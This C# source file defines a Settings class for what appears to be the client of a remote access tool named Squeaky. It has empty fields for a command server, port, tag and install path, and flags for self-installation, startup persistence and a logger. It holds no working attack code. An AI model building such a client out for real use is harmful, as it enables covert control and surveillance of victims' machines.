﻿using System.IO;

namespace Squeaky.Client
{
    public static class Settings
    {
        public static string SUBDIRECTORY = "";
        public static string INSTALLNAME = "";
        public static string BASEPATH = "";
        public static string INSTALLATION = Path.Combine(BASEPATH, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + $@"{INSTALLNAME}\{INSTALLNAME}.exe");
        public static string SERVER = "";
        public static string TAG = "";
        
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static bool LOGGER = false;

        public static int SERVERPORT = 0;
    }
}
